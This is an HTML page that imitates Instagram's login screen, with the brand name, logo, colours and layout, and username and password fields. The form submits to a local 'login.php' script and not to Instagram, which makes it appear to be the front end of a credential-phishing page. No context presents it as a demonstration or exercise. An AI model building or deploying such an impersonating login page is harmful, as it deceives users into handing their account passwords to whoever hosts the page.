<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #fafafa;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 1px;
            border: 1px solid #dbdbdb;
            width: 350px;
        }
        .logo {
            width: 175px;
            margin-bottom: 20px;
        }
        input {
            display: block;
            margin: 10px auto;
            padding: 10px;
            width: 85%;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            outline: none;
            background: #fafafa;
        }
        button {
            background: #3897f0;
            color: white;
            padding: 10px;
            border: none;
            cursor: pointer;
            width: 90%;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover {
            background: #3178c6;
        }
        p {
            margin-top: 15px;
            font-size: 14px;
        }
        p a {
            text-decoration: none;
            color: #00376b;
            font-weight: 500;
        }
        p a:hover {
            text-decoration: underline;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            margin-top: 10px;
            width: 350px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
            <form action="login.php" method="POST">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <p><a href="#">Forgot password?</a></p>
        </div>
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>
